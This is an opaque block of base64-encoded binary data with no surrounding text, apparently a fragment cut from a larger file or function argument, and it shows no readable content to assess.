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)
